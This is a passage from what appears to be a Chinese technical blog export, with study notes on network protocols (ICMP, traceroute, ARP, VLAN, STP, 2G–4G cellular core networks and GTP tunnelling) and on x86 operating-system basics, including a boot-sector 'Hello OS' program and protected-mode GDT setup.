头和 IP 正文的前 8 个字节</p></li><li><p>终点不可达为 3，源抑制为 4，超时为 11，重定向为 5</p><ul><li><p><strong>源站抑制</strong>，也就是让源站放慢发送速度</p></li><li><p><strong>时间超时</strong>，也就是超过网络包的生存时间还是没到</p></li><li><p><strong>路由重定向</strong>，也就是让下次发给另一个路由器</p></li></ul></li></ul><p>​</p><p>​</p><h4 id="Traceroute">Traceroute</h4><ul><li>Traceroute 会使用 ICMP 的规则故意制造一些能够产生错误的场景</li><li><strong>故意设置特殊的 TTL ，来追踪去往目的地时沿途经过的路由器</strong><ul><li>发送一份TTL字段为1的 UDP 数据包给目的主机，处理这个数据包的第一个路由器会给源主机发送一个 ICMP 报文（时间<strong>超时</strong>，报文中包含了第一个路由器的地址），然后发送一个TTL为2的数据报来得到第二个路由器的地址，继续这个过程，直至这个数据报到达目的主机</li><li>有的路由器不会回 ICMP，这也是 Traceroute 一个公网的地址看不到中间路由的原因</li><li>停止准则：选择目的端口号为一个不可能使用的端口号，当该数据报到达目的主机，将返回一份<strong>端口不可达</strong>错误 ICMP 报文（type=3,code=3），如果数据报没有到达，则可能是超时</li></ul></li><li><strong>故意设置不分片，从而确定路径的 MTU</strong><ul><li>首先发送分组，并设置不分片标志，发送的第一个分组的长度正好与出口 MTU 相等</li><li>如果中间遇到窄的关口会被卡住，会发送 ICMP 网络差错包，类型为<strong>需要进行分片但设置了不分片位</strong>，每次收到不能分片差错时就减小分组的长度，直到到达目标主机</li></ul></li></ul><p>​</p><p>​</p><h2 id="链路层">链路层</h2><p>​</p><h3 id="ARP">ARP</h3><blockquote><p>已知 IP 地址，求 MAC 地址的协议</p></blockquote><ul><li><p>在一个局域网里面，当知道了 IP 地址，不知道 MAC 怎么办呢？靠广播，谁是这个 IP 谁来回答</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210208-arp.png" style="zoom:50%;"></li><li><p>报文格式</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210208-arp-message.png" alt=""></p></li><li><p>为了避免每次都用 ARP 请求，机器本地也会进行 ARP 缓存；机器会不断地上线下线，IP 也可能会变，所以缓存过一段时间会过期</p></li></ul><p>​</p><blockquote><p>  RARP 协议：已知 MAC 求 IP</p><ul><li><p>无盘工作站无法持久化IP地址到本地，但有网卡，所以可以用RARP协议来获取IP地址</p></li><li><p>RARP可以用于局域网管理员想指定机器IP，又不想每台机器去设置静态IP的情况，可以在RARP服务器上配置MAC和IP对应的ARP表</p></li></ul></blockquote><p>​</p><h3 id="VLAN">VLAN</h3><ul><li><p>交换机数目多会面临<strong>隔离问题</strong>，可以通过 VLAN 形成<strong>虚拟局域网</strong>，从而解决<strong>广播问题和安全问题</strong></p></li><li><p>交换机可以设置交换机每个口所属的 VLAN，且可以重新设置</p></li><li><p>交换机区分局域网只需要在原来的二层的头上加一个 <code>TAG</code>，其中有一个12 位的 <code>VLAN ID</code>（<strong>可以划分 4096 个 VLAN</strong>），如果交换机支持 VLAN ，取下二层的头时，就能够识别 VLAN ID</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210208-vlan.png" alt=""></p></li><li><p>只有<strong>相同 VLAN 的包，才会互相转发</strong>，不同 VLAN 的包是看不到的</p></li><li><p>对于支持 VLAN 的交换机，交换机之间可以使用<strong>Trunk 口</strong>连接，它可以转发属于任何 VLAN 的口</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210208-trunk.png" alt=""></p><p>​</p></li></ul><h3 id="STP">STP</h3><ul><li><p>当交换机的数目越来越多时，交换机之间为了冗余、带宽提升、或错误连接难免会产生一个封闭的物理环路，遭遇<strong>环路问题</strong>，产生广播风暴（网络包迷路，一个包转来转去，每台机器都会发广播包，交换机转发也会复制广播包，当广播包越来越多的时候，路会越来越堵）这就需要使用 <strong>STP 协议，将有环路的图变成没有环路的树</strong>，将物理上存在环路的网络通过算法在逻辑上阻塞一些端口</p></li><li><p>概念</p><ul><li><strong>Root Bridge</strong>，<strong>根交换机</strong>，是某棵树的老大</li><li><strong>Designated Bridges</strong>，<strong>指定交换机</strong>，就是一棵树的树枝</li><li><strong>Bridge Protocol Data Units（BPDU）</strong>，<strong>网桥协议数据单元</strong><ul><li>交换机相连的时候，就需要“相互比较实力”</li><li>BPDU 只有根交换机能发</li></ul></li><li><strong>Priority Vector</strong>，<strong>优先级向量</strong><ul><li>[Root Bridge ID, Root Path Cost, Bridge ID, and Port ID]</li><li>先看 Root Bridge ID，再比 Root Path Cost，也即距离老大的距离，最后比 Bridge ID，拿自己的本事比</li></ul></li></ul></li><li><p>生成树协议运行生成树算法过程可以归纳为以下三个步骤：</p><ol><li>选择根交换机</li><li>选择根端口</li><li>选择指定端口</li></ol></li><li><p>STP缺点：一个是某个交换机状态发生变化的时候，整个树需要重新构建；被破开的环的链路被浪费</p></li></ul><p>​</p><p>​</p><h2 id="无线网络">无线网络</h2><h3 id="蜂窝因特网接入">蜂窝因特网接入</h3><h4 id="蜂窝网体系结构概述">蜂窝网体系结构概述</h4><h5 id="2G：语音与电话网连接">2G：语音与电话网连接</h5><ul><li><p>2G 时代上网使用的不是 IP 网络而是电话网络，即公共交换电话网（PSTN），走模拟信号</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220903-2g.jpg" alt=""></p></li><li><p>术语蜂窝是指由一个蜂窝网覆盖的区域被分成许多称为小区（cell）的地理覆盖区域，每个小区包含一个收发基站（BTS）负责向其小区内的移动站点发送接收信号</p></li><li><p>无线通信的服务端是基站子系统（BSS），基站子系统分两部分，一部分对外提供无线通信，叫做基站收发信台（BTS，Base Transceiver Station），另一部分对内连接有线网络，叫作基站控制器（BSC，Base Station Controller），基站收发信台通过无线收到数据后转发给基站控制器，这部分属于无线的部分，统称为无线接入网（RAN，Radio Access Network）</p></li><li><p>基站控制器通过有线网络，连接到提供手机业务的运营商的数据中心，这部分称为核心网（CN，Core Network），这部分还是主要提供手机业务，是手机业务的有线部分</p></li><li><p>核心网的入口是移动业务交换中心（MSC），通过网关（GMSC）连接核心网和电话网络，在用户鉴别和账户管理（决定是否允许某个移动设备与蜂窝网络连接）以及呼叫建立和切换中，移动交换中心起着决定性的作用</p><ul><li><p>鉴权中心（AUC）和设备识别寄存器（EIR）主要是负责安全性的</p></li><li><p>访问位置寄存器（VLR）是看你目前在的地方，归属位置寄存器（HLR）是看你的号码归属地</p></li></ul></li><li><p>2.5G 在原来电路交换的基础上，加入了分组交换业务，支持 Packet 的转发，从而支持 IP 网络</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220903-2.5g.jpg" alt=""></p></li></ul><h5 id="3G：将因特网扩展到蜂窝用户">3G：将因特网扩展到蜂窝用户</h5><ul><li><p>3G 核心蜂窝数据网将无线电接入网连接到公共因特网，不去触动现有核心 GSM 蜂窝语音网，增加与现有蜂窝语音网平行的附加蜂窝数据功能</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220903-3g.png" alt=""></p></li><li><p>3G 核心网中有两类节点：服务 GPRS 支持节点（SGSN，Service GPRS Supported Node）和网关 GPRS 支持节点（GGSN，Gateway GPRS Supported Node）</p><blockquote><p>GPRS 表示通用分组无线服务，这是一种在 2G 网络中的早期蜂窝数据服务，这里讨论的是在 3G 网络中 GPRS 的演化版本</p></blockquote></li><li><p>SGSN 负责向位于其连接的无线接入网中的移动节点收发数据报；与该区域蜂窝语音网的 MSC 进行交互，提供用户认证和切换，维护活跃移动节点的位置信息；执行移动节点和 GGSN 间的数据报转发</p></li><li><p>GGSN 起着网关的作用，将多个SGSN连接到更大的因特网</p></li><li><p>连接核心网的是无线网络控制器（RNC，Radio Network Controller），通常控制几个小区的收发基站，RNC 既通过 MSC 与电路交换蜂窝语音网连接，又通过 SGSN 与分组交换的因特网连接</p><blockquote><p>3G <a href="https://en.wikipedia.org/wiki/UMTS">UMTS</a> 的正式用语称为一个 Node B</p></blockquote></li></ul><h5 id="4G：LTE">4G：LTE</h5><ul><li><p>3GPP 提出的 4G 长期演进互联网（LTE，Long-Term Evolution）标准有两个重要的创新：<strong>全 IP 核心网</strong>和加强的无线接入网</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220903-4g.png" alt=""></p></li><li><p>无线接入网与全 IP 核心网之间清晰分离，核心网实现了控制面和数据面的分离</p><ul><li>承载用户数据的 IP 数据报经过内部 4G IP 网络，在用户（UE）和网关（P-GW）之间转发</li></ul></li><li><p>4G 体系结构的主要组件</p><ul><li>基站为 eNodeB，包含了原来 Node B 和 RNC 的功能</li><li>分组数据网络网关（P-GW）：给 UE 分配 IP 地址，并且保证 QoS 实施，也执行数据报封装/解封装</li><li>服务网关（S-GW）：所有 UE 流量将通过 S-GW 传递</li><li>移动性管理实体（MME）是核心控制网元，是控制面的核心，它代表位于它所控制单元中的 UE，执行连接和移动性管理</li><li>HSS 用于存储用户签约信息（号码归属地以及一些认证信息）的数据库，当手机通过 eNodeB 连上的时候，MME 会根据 HSS 的信息进行判断，选择数据面的 SGW 和 PGW</li></ul></li><li><p>手机直接通过 eNodeB 连接 SGW，连上核心网，并通过 PGW 连到 IP 网络</p></li></ul><h4 id="4G-网络协议">4G 网络协议</h4><ul><li><p>4G 网络的协议</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220903-4g-network-protocol.jpg" alt=""></p></li></ul><h5 id="控制面协议">控制面协议</h5><ul><li><p>当一个手机想上网的时候，先要连接 eNodeB，并通过 S1-MME 接口，请求 MME 对这个手机进行认证和鉴权</p></li><li><p>S1-MME 协议栈</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220904-S1-MME.jpg" alt=""></p></li><li><p>eNodeB 和 MME 之间的连接是 IP 网络，传输层的协议是 <code>SCTP</code>，更加适合移动网络</p><ul><li><p><strong>多宿主</strong>，SCTP 引入了联合（association）的概念，将多个接口、多条路径放到一个联合中来，当检测到一条路径失效时，协议就会通过另外一条路径来发送通信数据，应用程序不必知道发生了故障、恢复，从而提供更高的可用性和可靠性</p></li><li><p><strong>将一个联合分成多个流</strong>，一个联合中的所有流都是独立的，但均与该联合相关，每个流都给定了一个流编号，它被编码到 SCTP 报文中，通过联合在网络上传送，SCTP 的多个流不会相互阻塞</p></li><li><p><strong>四次握手</strong>，通过四次握手引入 Cookie 的概念来有效地防止 SYN 攻击</p><ul><li>客户机使用一个 <code>INIT</code> 报文发起一个连接</li><li>服务器使用一个 <code>INIT-ACK</code> 报文进行响应，其中包括了 Cookie</li><li>然后客户端就使用一个 <code>COOKIE-ECHO</code> 报文进行响应，其中包含了服务器所发送的 Cookie</li><li><strong>服务器为这个连接分配资源</strong>，并通过向客户机发送一个 <code>COOKIE-ACK</code> 报文对其进行响应</li></ul></li><li><p><strong>消息分帧</strong>，借鉴了 UDP 的机制，在数据传输中提供了消息分帧功能，当一端对一个套接字执行写操作时，可确保对等端读出的数据大小与此相同</p></li><li><p><strong>三次挥手</strong>，当一端关闭自己的套接字时，对等的两端全部关闭，将来任何一端都不允许再进行数据的移动</p></li></ul></li><li><p>MME 通过认证鉴权同意手机上网时，需建立一个数据面的数据通路，使用的是控制面的协议 <code>GTP-C</code>，协议基于 UDP 协议；数据通路分为两个隧道，一段是从 eNodeB 到 SGW，MME 通过 S1-MME 协议告诉 eNodeB 它是隧道的一端，通过 S11 告诉 SGW 它是隧道的另一端，第二段 SGW 通过 S11 协议知道自己是其中一端，并主动通过 S5 协议告诉 PGW 它是隧道的另一端</p><ul><li>GTP 头中由隧道 ID，还有序列号；通过序列号 GTP-C 可以实现可靠性，为每个输出信令消息分配一个依次递增的序列号，以确保按序传递并便于检测重复包，对于每个输出信令消息启动定时器，在定时器超时前未接收到响应消息则进行重发</li></ul></li></ul><h5 id="数据面协议">数据面协议</h5><ul><li><p>当数据通路建立，PGW 会给用户分配 IP 地址，使用这个地址连接 eNodeB，经过 S1-U 协议，通过第一段隧道到达 SGW，再从 SGW 经过 S8 协议，通过第二段隧道到达 PGW，然后通过 PGW 连接到互联网</p><blockquote><p>这个 IP 地址是隧道内部的 IP 地址，可类比为 IPsec 协议中的 IP 地址，这个 IP 地址由手机运营商管理</p></blockquote></li><li><p>数据面的协议都是通过 <code>GTP-U</code>，用户发出的包都由 GTP-U 隧道协议封装</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220904-GTP-U.jpg" alt=""></p></li><li><p>GTP-U 协议分为乘客协议、隧道协议、承载协议；乘客协议是用户发出的包，IP 是用户 IP，隧道协议里面有隧道 ID，不同的手机上线会建立不同的隧道，承载协议的 IP 地址是 SGW 和 PGW 的 IP</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220904-GTP-U-format.jpg" alt=""></p></li></ul><h5 id="上网流程">上网流程</h5><ol><li><p>用户在附近寻找基站 eNodeB，发送 Attach Request</p></li><li><p>eNodeB 将请求发给 MME</p></li><li><p>MME 对用户进行认证、鉴权等，通过之后开始分配隧道</p></li><li><p>MME 先告诉 SGW 要创建一个会话（Create Session），给 SGW 分配一个隧道 ID t1，并且请求 SGW 给自己也分配一个隧道 ID</p></li><li><p>SGW 向 PGW 请求建立一个会话，为 PGW 控制面分配一个隧道 ID t2，为 PGW 数据面分配一个隧道 ID t3，并且请求 PGW 给自己的控制面和数据面分配隧道 ID</p></li><li><p>PGW 使用自己的 ID t2 回复 SGW 创建会话成功，回复里面携带着给 SGW 控制面分配的隧道 ID t4 和数据面的隧道 ID t5，至此 SGW 和 PGW 直接的隧道建设完成</p></li><li><p>SGW 回复 MME  创建会话成功，回复里面有给 MME 分配隧道 ID t6，也有 SGW 给 eNodeB 分配的隧道 ID t7</p></li><li><p>MME 告诉 eNodeB：“后面的隧道建设完毕，SGW 给你分配的隧道 ID 是 t7，你也要给 SGW 分配一个隧道 ID”</p></li><li><p>eNodeB 告诉 MME 自己给 SGW 分配一个隧道 ID t8</p></li><li><p>MME 将 eNodeB 给 SGW 分配的隧道 ID t8 告知 SGW，从而前面的隧道也建设完毕，用户可通过数据通路上网</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220904-surf-Internet.jpg" alt=""></p><blockquote><p>为什么要分 SGW 和 PGW 呢？</p><p>SGW 是本地运营商的设备，而 PGW 是用户所属的运营商的设备，例如异地上网时，用户和国外运营商的 SGW 会建立一个隧道，然后国外运营商的 SGW 和国内运营商的 PGW 建立一个隧道，用户就能够通过国内运营商的 PGW 上网，用户分配到的 IP 地址也是国内运营商的 PGW 负责（所以还是上不了推）</p></blockquote></li></ol><hr><p>参考</p><ul><li>趣谈网络协议</li><li>Web协议详解与抓包实战</li><li><a href="https://www.ruanyifeng.com/blog/2011/09/restful.html">理解 RESTful 架构</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 容器 </tag>
            
            <tag> 计算机网络 </tag>
            
            <tag> 网络协议 </tag>
            
            <tag> 云计算 </tag>
            
            <tag> 微服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统基础和开发实践</title>
      <link href="2021/01/28/hello-os/"/>
      <url>2021/01/28/hello-os/</url>
      
        <content type="html"><![CDATA[<h2 id="01-Hello-OS">01 | Hello OS</h2><ul><li><p>工具：<code>VirtualBox</code>、<code>Nasm</code> （汇编）</p></li><li><p>目标：通过硬盘启动自己的操作系统</p></li></ul><blockquote><p>实验：完成第一个引导扇区启动程序</p></blockquote><ol><li><p>生成虚拟磁盘：将虚拟文件当做硬盘挂载</p><p><code>diskpart</code>命令：制作自己的虚拟磁盘</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210918-diskpart.png" alt="执行diskpart命令得到vhd"></p></li><li><p>编写汇编代码<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">org 07c00h ; 指定下面的指令从7c00h处开始mov ax,csmov ds,ax  ; 使数据段与代码段在同一个段mov es,ax  ; 使附加段与代码段在同一个段call Disp  ; 调用子程序显示字符串信息jmp $      ; 死循环Disp:mov ax,BootMsgmov bp,axmov cx,16; ah=13h 10h中断13h号功能：在Teletype模式下显示字符串mov ax,01301hmov bx,000chmov dl,0int 10h ; 调用10h中断BootMsg: db "Hello, OS World!"times 510 - ($-$$)db 0 ; 填充0（$ 当前位置 $$ 程序起始位置）dw 0xaa55  ; 魔数，硬盘主引导分区可引导标识<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>此代码段是存于磁盘引导扇区的系统引导程序</p><p>若存于硬盘第一个扇区，则这段代码称为硬盘主引导记录</p></blockquote></li><li><p>使用<code>Nasm</code>进行编译</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220213-nasm1.png" alt=""></p></li><li><p>使用<code>dd</code>工具将<code>.bin</code>文件写入磁盘</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220213-dd1.png" alt=""></p></li><li><p>在虚拟机中运行</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220213-vm-run.png" alt=""></p></li></ol><p>​</p><h2 id="02-操作系统基础">02 | 操作系统基础</h2><ul><li><p>内核是计算机资源的管理者，计算机中资源大致可以分为两类，硬件资源和软件资源</p><ul><li>计算机中的软件资源则可表示为计算机中的各种形式的数据，如各种文件、软件程序等</li><li>计算机中的硬件资源有总线（负责连接各种其它设备）、CPU、内存、硬盘、网卡、显卡、各种I/O设备</li></ul></li><li><p>内核的内部组成在逻辑上大致如下：</p><ul><li>管理CPU，内核把运行时的程序抽象成进程，所以又称为<strong>进程管理</strong></li><li><strong>管理内存</strong>，内存是宝贵的资源，所以内核要非常小心地分配、释放内存</li><li>管理硬盘，内核把用户数据抽象成文件，文件需要合理地组织，方便用户查找和读写，所以形成了<strong>文件系统</strong></li><li>管理显卡，现在操作系统都支持GUI，形成了内核中的<strong>图形系统</strong></li><li>管理网卡，网络通信需要各种通信协议，在内核中就形成了网络协议栈，又称<strong>网络组件</strong></li><li>管理各种I/O设备，在内核中抽象成<strong>I/O管理器</strong></li><li>内核除了这些必要组件之外，根据功能不同还有安全组件等</li></ul></li><li><p>内核结构：宏内核、微内核</p></li><li><p>分离硬件相关性</p></li></ul><br><h3 id="CPU-工作模式">CPU 工作模式</h3><ul><li>按照 x86 CPU 功能升级迭代的顺序，CPU 的工作模式有实模式、保护模式、长模式</li></ul><h4 id="实模式">实模式</h4><ul><li><p>实模式又称实地址模式，实分为两个方面，一个方面是<strong>运行真实的指令</strong>，对指令的动作不作区分直接执行，另一方面是<strong>发往内存的地址是真实的</strong>，对任何地址不加限制</p></li><li><p>CPU复位或加电的时候以实模式启动，处理器以实模式工作</p></li></ul><h5 id="实模式下访问内存">实模式下访问内存</h5><ul><li><p>内存寻址方式和8086相同（分段内存管理模型），由基地址加上偏移地址形成20位的物理地址，最大寻址空间<strong>1MB</strong><sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>，最大分段64KB（$2^{16}$）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220703-access-memory.jpg" alt=""></p></li></ul><h5 id="实模式中断">实模式中断</h5><ul><li><p>实现过程是先保存 CS 和 IP 寄存器，然后装载新的 CS 和 IP 寄存器</p></li><li><p>实模式下的中断有硬件中断与软件中断，都是CPU响应外部事件的一种方式</p><ul><li>硬件中断：中断控制器给CPU发送一个电子信号，CPU会对这个信号作出应答，随后中断控制器会将中断号发送给CPU</li><li>软件中断：CPU执行了<strong>INT指令</strong>，这个指令后面会跟随一个常数，即软中断号</li></ul></li><li><p>为了实现中断，就需要在内存中放一个<strong>中断向量表</strong>，这个表的地址和长度由CPU的特定寄存器IDTR指向</p></li><li><p>实模式下，表中的一个条目由<strong>代码段地址</strong>和<strong>段内偏移</strong>组成</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220703-interrupt.jpg" alt=""></p></li><li><p>有了中断号，CPU就能根据IDTR寄存器中的信息，计算出中断向量中的条目，进而装载CS、IP寄存器，最终响应中断</p></li></ul><h4 id="保护模式">保护模式</h4><ul><li><p>在80286以前 CPU 只有实模式</p><ul><li><p>最多能够访问1M的内存空间</p></li><li><p>可以任意访问内存，操作系统和用户程序实际上做不到内存的隔离</p></li><li><p>用户程序访问的逻辑地址实际上就是物理地址</p></li><li><p>用户程序可以随意修改段基址</p></li></ul></li><li><p>随着CPU的发展，CPU的地址线变为32根，至少可以访问到4G的内存空间，引入了保护模式，实现更大空间的，更灵活也<strong>更安全</strong>的内存访问</p><ul><li><p>为了保证向下兼容，80286及以后的CPU首先进入实模式，然后通过切换机制再进入到保护模式</p></li><li><p>保护模式下把关于内存段的限制信息放在<strong>全局描述符表（GDT）<strong>中，全局描述符表中的表项称为</strong>段描述符</strong></p></li></ul></li></ul><p>段+偏移的编程寻址结构</p><p><strong>寻址问题</strong>，</p><p>CPU的寄存器和运算单元扩展成32位</p><p>不过，虽然扩展CPU内部器件的位数解决了计算和寻址问题，但仍然没有解决前面那个实模式场景下的问题，导致前面场景出问题的原因有两点。第一，CPU对任何指令不加区分地执行；第二，CPU对访问内存的地址不加限制。</p><h5 id="保护模式寄存器">保护模式寄存器</h5><ul><li><p>保护模式相比于实模式，增加了一些控制寄存器和段寄存器，扩展通用寄存器的位宽，所有的通用寄存器都是32位</p></li><li><p>可以单独使用低16位，这个低16位又可以拆分成两个8位寄存器</p></li><li><p>CR0/CR1/CR2/CR3 是32位CPU控制寄存器，控制CPU的功能控制特性，如开启保护模式等</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-32-os.png" alt=""></p></li></ul><h5 id="保护模式特权级">保护模式特权级</h5><ul><li><p>为了计算机的安全，区分哪些指令和资源可以被访问，CPU将程序拥有的权力划分为了4个特权级（运行级别）</p><ul><li>在任何给定的时间，CPU都以特定的特权级别运行</li><li>3个受保护的主要资源：内存、I/O端口和执行某些机器指令的能力</li></ul></li><li><p>特权级分为4级（R0~R3），每个特权级执行指令的数量不同，R0可以执行所有指令，R1、R2、R3依次递减，它们只能执行上一级指令数量的子集</p></li><li><p>在保护模式下，CPU利用CPL/RPL/DPL对程序的访问操作进行特权级检查，数据段和代码段的特权级检查规则有所不同<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup></p><ul><li>CPL（Current Privilege Level）是当前进程的权限级别，是当前正在执行的代码所在的段的特权级，存在于CS寄存器的低两位</li><li>RPL（Request Privilege Level）是进程对段访问的请求权限，存放在段选择子中，RPL可能会削弱CPL的作用，例如当前CPL=0的进程要访问一个数据段，它把段选择符中的RPL设为3，这样虽然它对该段仍然只有特权为3的访问权限。</li><li>DPL（Descriptor Privilege Level），存放在段描述符中，规定访问该段的权限级别</li></ul></li><li><p>段描述符和特权级相互配合实现内存的访问<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup></p></li></ul><h5 id="保护模式段描述符">保护模式段描述符</h5><ul><li><p>描述一个段的信息封装成特定格式的<strong>段描述符</strong></p></li><li><p>一个段描述符有64位8字节数据，里面包含了段基地址、段长度、段权限、段类型、段是否可读写，可执行等</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220703-segment-descriptor.jpg" alt=""></p></li><li><p>段描述符的 Base 字段描述了一个段的的基地址，再加上段内偏移offset，就得到了线性地址</p></li><li><p>多个段描述符在内存中形成<strong>全局段描述符表</strong>（<code>GDT</code>），该表的基地址和长度由CPU和<strong>GDTR</strong>寄存器（48bit）指示，访问一个内存地址时，段寄存器中的索引首先会结合GDTR寄存器找到内存中的段描述符，再根据其中的段信息判断能不能访问成功</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220703-gdt.jpg" alt=""></p></li></ul><h5 id="保护模式段选择符">保护模式段选择符</h5><ul><li><p>段寄存器中不再存放段基地址，而是<strong>段选择符</strong>，由段描述符索引、描述符表索引、权限级别组成的</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220703-segment-selector.jpg" alt=""></p></li><li><p>为了方便快速检索段选择符，处理器提供了 6 个分段寄存器来缓存段选择符</p></li><li><p><strong>影子寄存器</strong>是硬件为了减少性</p></li><li><p>能损耗而设计的一个段描述符的高速缓存，对系统程序员不可见，影子寄存器是64位，里面存放了8字节段描述符数据</p></li><li><p>段描述符索引（Index）是13位的索引号</p></li><li><p>TI 表示使用的是 GDT 还是 LDT</p><ul><li>一些全局的段描述符，就放在全局段描述符表（GDT）中</li><li>一些局部的，例如每个进程自己的，就放在局部段描述符表（LDT）中</li></ul></li></ul><h5 id="Memory-Management-Models">Memory Management Models</h5><ul><li><p>Segmented memory model</p></li><li><p>Real-address mode memory model</p></li><li><p>Flat memory model（<strong>平坦模型</strong>）</p><ul><li><p>分段模型有很多缺陷，现代操作系统都会使用分页模型，但是x86 CPU并不能直接使用分页模型，而是要在分段模型的前提下，根据需要决定是否要开启分页，但是我们可以简化设计，来使分段成为一种“虚设”</p></li><li><p>CPU 32位寄存器最多只能产生4GB大小的地址，在32位环境下用一个段就能够访问到硬件所支持的所有内存，所以把所有段的基地址设为0，段的长度设为0xFFFFF，段长度的粒度设为4KB，这样所有的段都指向同一个地址空间</p></li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">GDT_START:knull_dsc: dq 0;第一个段描述符CPU硬件规定必须为0kcode_dsc: dq 0x00cf9e000000ffff;段基地址=0，段长度=0xfffff;G=1,D/B=1,L=0,AVL=0 ;P=1,DPL=0,S=1;T=1,C=1,R=1,A=0kdata_dsc: dq 0x00cf92000000ffff;段基地址=0，段长度=0xfffff;G=1,D/B=1,L=0,AVL=0 ;P=1,DPL=0,S=1;T=0,C=0,R=1,A=0GDT_END:GDT_PTR:GDTLENdw GDT_END-GDT_START-1GDTBASEdd GDT_START<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="保护模式中断">保护模式中断</h5><ul><li><p>保护模式下的中断要权限检查，还有特权级的切换，所以就需要扩展中断向量表的信息，即每个中断用一个<strong>中断门描述符</strong>（Interrupt Gate Descriptor）来表示，也可简称中断门</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220704-interrupt-gate.jpg" alt=""></p></li><li><p>在内存中有一个中断向量表，同样是由IDTR寄存器指向，中断向量表中的条目变成了中断门描述符</p></li><li><p>产生中断后，CPU首先会检查中断号是否大于<strong>最后一个中断门描述符</strong>，x86 CPU最大支持256个中断源，然后检查描述符类型（是否是中断门或者陷阱门）、是否为系统描述符，是否在内存中，接着检查中断门描述符中的段选择子指向的<strong>段描述符</strong>，最后做<strong>权限检查</strong>，做完一系列检查之后，CPU才会加载中断门描述符中目标代码段选择子到CS寄存器中，把目标代码段偏移加载到EIP寄存器中</p></li><li><p>权限检查：如果CPL$\le$中断门的DPL且$\ge$中断门中的段选择子RPL，就指向段描述符的DPL，进一步的，CPL$=$段描述符的DPL，则为同级权限不进行栈切换，否则进行栈切换，如果进行栈切换，还需要从TSS中加载具体权限的SS、ESP，也要对SS中段选择子指向的段描述符进行检查</p></li></ul><h5 id="进入保护模式">进入保护模式</h5><ol><li><p>准备全局段描述符表（最少包含三个描述符：空描述符、代码段描述符及数据段描述符）</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">GDT_START:knull_dsc: dq 0kcode_dsc: dq 0x00cf9e000000ffffkdata_dsc: dq 0x00cf92000000ffffGDT_END:GDT_PTR:GDTLENdw GDT_END-GDT_START-1GDTBASEdd GDT_START<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>加载设置GDTR寄存器，使之指向全局段描述符表</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lgdt [GDT_PTR]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置CR0寄存器，开启保护模式</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">;开启 PEmov eax, cr0bts eax, 0                      ; CR0.PE =1mov cr0, eax         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>进行长跳转，加载CS段寄存器</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmp dword 0x8 :_32bits_mode ;_32bits_mode为32位代码标号即段偏移<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="长模式">长模式</h4><ul><li>长模式又名AMD64，因为这个标准是AMD公司最早定义的，它使CPU在现有的基础上有了64位的处理能力，既能完成64位的数据运算，也能寻址64位的地址空间</li></ul><h5 id="长模式寄存器">长模式寄存器</h5><ul><li><p>长模式相比于保护模式增加了一些通用寄存器，并扩展通用寄存器的位宽，所有的通用寄存器都是64位，还可以单独使用低32位</p></li><li><p>低32位可以拆分成一个低16位寄存器，低16位又可以拆分成两个8位寄存器</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220704-long-mode-register.jpg" alt=""></p></li></ul><h5 id="长模式段描述符">长模式段描述符</h5><ul><li><p>长模式下段描述的格式</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220704-long-mode-segment-descriptor.jpg" 